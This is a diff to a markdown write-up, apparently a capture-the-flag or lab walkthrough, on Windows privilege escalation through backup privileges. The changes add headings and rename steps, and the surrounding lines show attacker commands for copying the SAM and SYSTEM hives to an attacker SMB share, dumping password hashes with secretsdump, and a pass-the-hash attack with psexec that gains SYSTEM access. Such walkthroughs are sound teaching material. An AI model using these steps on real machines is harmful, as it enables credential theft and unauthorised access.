@@ -33,6 +33,9 @@ SeRestorePrivilege            Restore files and directories  Disabled
 
 <br/>
 
+### Hashes
+
+
 - BackUP `SAM` and `SYSTEM` Hashes.
 
 ```log
@@ -50,7 +53,7 @@ attacker@machine:~$ smbserver $SHARE_NAME $DIRECTORY
 
 <br/>
 
-- Using <b style={{ color: 'Coral' }}>secretsdump.py</b> to Retrieve the User Password Hashes.
+- Using <b style={{ color: 'Coral' }}>secretsdump</b> to Retrieve the User Password Hashes.
 
 ```log
 attacker@machine:~$ secretsdump.py -sam sam.hive -system system.hive LOCAL
@@ -63,8 +66,10 @@ Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
 
 <br/>
 
-- Using <b style={{ color: 'Coral' }}>psexec.py</b>
-- Using **`Administrator`** HASH to perform a **`Pass-the-Hash`** Attack and gain Access to the Target Machine with <b style={{ color: 'Red' }}>SYSTEM</b> Privileges.
+### Pass-the-Hash
+
+- Using <b style={{ color: 'Coral' }}>psexec</b> to perform the Attack.
+- Using the **`Administrator`** **HASH** to perform a <b style={{ color: 'HotPink' }}>Pass-the-Hash</b> Attack and gain Access to the Target Machine with <b style={{ color: 'Red' }}>SYSTEM</b> Privileges.
 
 
 ```log
